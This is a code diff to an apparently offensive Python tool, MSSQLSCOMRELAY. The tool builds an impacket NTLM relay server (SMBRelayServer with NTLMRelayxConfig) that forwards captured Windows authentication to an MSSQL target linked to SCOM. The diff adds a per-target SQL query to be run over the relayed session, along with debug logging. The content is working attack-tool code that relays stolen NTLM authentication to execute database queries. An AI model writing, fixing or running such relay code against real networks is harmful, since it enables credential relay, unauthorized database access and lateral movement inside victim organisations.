@@ -146,7 +146,15 @@ class MSSQLSCOMRELAY:
 
         config = NTLMRelayxConfig()
         config.setTargets(target_processor)
+        
+        # Set the query for MSSQL - this is how ntlmrelayx does it with -q flag
+        config.queries = {}
+        config.queries[self.target] = self.query
+        logger.info(f"[DEBUG] Set query in config.queries: {config.queries}")
+        
+        # Also try setting it as an attack
         config.setAttacks({"MSSQL": self.get_attack_mssql_client})
+        
         config.setListeningPort(port)
         config.setInterfaceIp(interface)
         config.setSMB2Support(True)
@@ -154,6 +162,7 @@ class MSSQLSCOMRELAY:
         config.setOutputFile(None)
 
         self.server = SMBRelayServer(config)
+        logger.info("[DEBUG] SMBRelayServer created successfully")
 
     def convert_string_sid(self, sid):
         """Convert string SID to hex format for SQL query"""
